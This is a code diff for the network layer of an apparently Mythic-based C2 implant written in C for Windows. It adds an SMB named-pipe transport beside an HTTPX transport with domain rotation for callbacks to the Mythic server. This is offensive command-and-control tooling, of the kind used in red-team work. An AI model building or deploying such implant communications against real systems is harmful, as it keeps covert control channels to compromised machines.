@@ -2,11 +2,15 @@
 
 #include "Network.h"
 #include "Config.h"
-#include "Http.h"
+#include "TransportHttp.h"
+#include "TransportSmb.h"
 #include "Parser.h"
 #include "Package.h"
 #include "Strategy.h"
 #include "Sleep.h"
+
+
+#ifdef HTTPX_TRANSPORT
 
 #define GET_REQUEST     0x00
 #define POST_REQUEST    0x01
@@ -15,19 +19,7 @@ HANDLE gHttpMutex = NULL;
 
 BOOL NetworkHttpXSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen);
 
-
-/**
- * @brief Initialize a mutex for preventing a race condition with global HINTERNET handles.
- * @return VOID
- */
-VOID NetworkInitMutex()
-{
-    gHttpMutex = CreateMutex(NULL, FALSE, NULL);
-    if (!gHttpMutex)
-    {
-        _err("Failed to create HTTP mutex");
-    }
-}
+#endif  // HTTPX_TRANSPORT
 
 
 /**
@@ -39,9 +31,9 @@ VOID NetworkInitMutex()
  * 
  * @return BOOL
  */
-BOOL NetworkRequest(_In_ PPackage package, _Out_ PBYTE* ppOutData, _Out_ SIZE_T* pOutLen)
+BOOL NetworkRequest(_In_ PPackage package, _Out_ PBYTE* ppOutData, _Out_ SIZE_T* pOutLen, _In_ BOOL IsGetResponse)
 {
-// HTTPX C2 Profile (only currently supported c2 profile)
+/* HTTPX C2 Profile */
     #ifdef HTTPX_TRANSPORT
         BOOL bStatus = FALSE; 
         
@@ -54,7 +46,16 @@ BOOL NetworkRequest(_In_ PPackage package, _Out_ PBYTE* ppOutData, _Out_ SIZE_T*
         return TRUE;
     #endif
 
-    #ifdef HTTP_TRANSPORT
+/* SMB C2 Profile */
+    #ifdef SMB_TRANSPORT
+        BOOL bStatus = FALSE; 
+        
+        /* Send data to named pipe */
+        bStatus = NetworkSmbSend(package, ppOutData, pOutLen, IsGetResponse);
+        
+        if ( bStatus == FALSE )
+            return FALSE;
+
         return TRUE;
     #endif
 
@@ -85,11 +86,15 @@ BOOL NetworkHttpXSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
         with multi-threading there is a possibilty of gInternetConnect/gInternetOpen 
         handles being freed while they're being used in another thread.
     */
-    if (WaitForSingleObject(gHttpMutex, INFINITE) != WAIT_OBJECT_0)     // Locks 
+    if ( gHttpMutex == NULL ) {
+        gHttpMutex = CreateMutex(NULL, FALSE, NULL);
+    }
+
+    if ( WaitForSingleObject(gHttpMutex, INFINITE) != WAIT_OBJECT_0 )     // Locks 
     {
         _dbg("WaitForSingleObject failed : ERROR %d", GetLastError());
     }
-        
+
 
     SIZE_T bufferLen = package->length;
     BYTE reqProfile = (bufferLen > 500) ? POST_REQUEST : GET_REQUEST;   // Choose request type based on payload size
@@ -99,7 +104,7 @@ BOOL NetworkHttpXSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
     BOOL bStatus = TRUE;
 
 retry_request:
-    // Domain rotation strategy
+    /* Rotate domains if the HTTP request failed */
     StrategyRotate(bStatus, &gFailureCount);
 
     switch (reqProfile)
@@ -140,13 +145,33 @@ retry_request:
     return bStatus;
 }
 
-#endif
+#endif  // HTTPX_TRANSPORT
 
 
 
-#ifdef HTTP_TRANSPORT
-    // good code
-#endif
+#ifdef SMB_TRANSPORT
+/**
+ * @brief Transport Mythic using SMB profile.
+ * 
+ * @param[in] package Payload to send to Mythic server.
+ * @param[out] ppOutData Output buffer from response.
+ * @param[out] pOutLen Length of response output.
+ * 
+ * @return BOOL
+ */
+BOOL NetworkSmbSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen, BOOL IsGetResponse)
+{
+    BOOL bStatus = FALSE;
+
+    /* Create/Write data to SMB Comms Channel */
+    bStatus = SmbSend(package);
+    
+
+    return bStatus;
+}
+
+
+#endif  // SMB_TRANSPORT
 
 
 #ifdef DNS_TRANSPORT
